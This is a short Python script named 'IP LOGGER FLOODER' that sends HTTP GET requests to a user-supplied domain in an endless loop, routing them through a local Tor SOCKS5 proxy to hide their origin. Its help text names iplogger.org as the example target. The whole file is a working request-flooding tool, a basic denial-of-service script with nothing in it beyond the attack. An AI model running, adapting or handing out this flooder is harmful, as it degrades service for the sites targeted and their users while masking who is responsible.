import requests
import sys
import os
count = 0
def help():
	help = str('''
	IP LOGGER FLOODER - cypress
	
	ARGUMENTS MARKED WITH * ARE REQUIRED!
	
	DOCS:
	
	--help: DISPLAYS THIS MESSAGE 
	--domain: DOMAIN TO SEND REQUESTS TO (*)
	
	Example: python3 iploggerflood.py --domain https://iplogger.org
	''')
	print(help)
	sys.exit()

if len(sys.argv) == 1:
	help()
elif len(sys.argv) == 2:
	help()
elif len(sys.argv) == 3:
	site = sys.argv[2]
	if "help" in sys.argv:
		help()
		sys.exit()
	elif "--domain" in sys.argv:
		while True:
			site = sys.argv[2]
			headers = {
				'User-Agent': 'IPFLODDER/1.0 (Compatable With Linux/Windows) UsingPyRequests/:) (Block Agent/IP If Abusing) {Tool Made by cypress} {Symphanny On Top}',
			}
			r = requests.get(site, headers=headers, proxies=dict(http='socks5://localhost:9050', https='socks5://localhost:9050'))
			print("Sent request to {} and got code {}!".format(site, r.status_code))
	else:
		help()
